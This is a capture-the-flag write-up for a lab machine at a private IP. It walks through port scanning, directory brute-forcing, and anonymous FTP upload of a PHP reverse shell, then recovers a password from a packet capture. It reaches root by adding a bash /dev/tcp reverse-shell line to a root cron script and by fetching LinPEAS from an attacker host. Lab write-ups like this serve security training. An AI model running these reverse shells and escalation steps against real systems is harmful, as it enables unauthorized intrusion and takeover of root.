## Target IP: `10.10.213.54`

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O 10.10.213.54 -oN results.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 |

---

### Web Enumeration

Visited HTTP server → Page contains message:

```
No spice here!

Please excuse us as we develop our site. We want to make it the most stylish and convenient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, contact us. Otherwise, don't you worry. We'll be online shortly!

— Dev Team
```

- Page source shows nothing interesting.

---

### Directory Bruteforce (Using `ffuf`)

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -ic -c -r -o startup.ffuf -u http://10.10.213.54/FUZZ
```

**Found:**

- `/files`
- Inside `/files`, found `ftp/` directory

---

### FTP Access

- Logged in anonymously:

```bash
ftp 10.10.213.54
# Username: anonymous
```

- `/ftp` directory matched what was seen in `/files/ftp`

---

### Upload Reverse Shell

- Used PHP reverse shell from:

```
/usr/share/webshells/php/php-reverse-shell.php
```

- Modified:
    - `LHOST` → Attacker IP
    - `LPORT` → 8080
- Uploaded to FTP server
- Started listener:

```bash
nc -lvnp 8080
```

- Accessed reverse shell via web
- Shell connected

---

### Shell Upgrade (TTY Fix)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo
fg
[press Enter twice]
export TERM=xterm
```

**Explanation:**

- `pty.spawn("/bin/bash")`: Spawns a pseudo-terminal for a more interactive shell
- `CTRL+Z`: Backgrounds the current shell
- `stty raw -echo`: Fixes input so it behaves like a normal terminal
- `fg`: Brings the background shell back to the foreground
- `export TERM=xterm`: Ensures correct terminal type for applications like `nano`, `less`, etc.

---

### First Flag

```bash
cd /
cat recipe.txt
# → First flag found
```

---

### Privilege Escalation – PCAP Analysis

**Found:**

- `/root/incidents/suspicious.pcapng`

**Downloaded via Python web server:**

On victim:

```bash
cd /root/incidents
python3 -m http.server 7575
```

On local machine:

```bash
wget http://10.10.213.54:7575/suspicious.pcapng
```

---

### Wireshark Analysis

Opened `.pcapng` file in Wireshark.

- Searched for readable data by:
    - Scrolling through packets
    - Looking at bottom-right panel
    - Right-clicking and selecting **Follow TCP Stream** to reconstruct session data

**Goal:** Look for protocols known to send plaintext:

- HTTP
- FTP
- SMTP
- TELNET
- SMB
- DNS
- SSH (for context only, encrypted)

**Found in stream:**

```
sudo attempt with password: [REDACTED]
```

---

### Lateral Movement

```bash
su lennie
# Password: [REDACTED]
```

- Switch to user `lennie` successful

---

### LinPEAS Privilege Escalation Check

On local machine:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
python3 -m http.server 80
```

On victim:

```bash
wget http://<attacker-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

### Finding Root via Cron Job

- LinPEAS (or writeup) revealed a suspicious file:

```
/etc/print.sh
```

- Not a standard system file
- Assumed to be a cron job run as root

**Payload added to `print.sh`:**

```bash
bash -i >& /dev/tcp/<attacker-ip>/8765 0>&1
```

- Set up listener:

```bash
nc -lvnp 8765
```

- Waited a minute, connection came in as root

**Explanation for Future Reference:**

The `print.sh` script was being executed automatically by a root-owned cron job. Since you modified the script, and the cron job runs **as root**, your reverse shell executed as root, giving you a root shell.

---

### Final Result

```bash
whoami
# → root
```

Root access achieved.
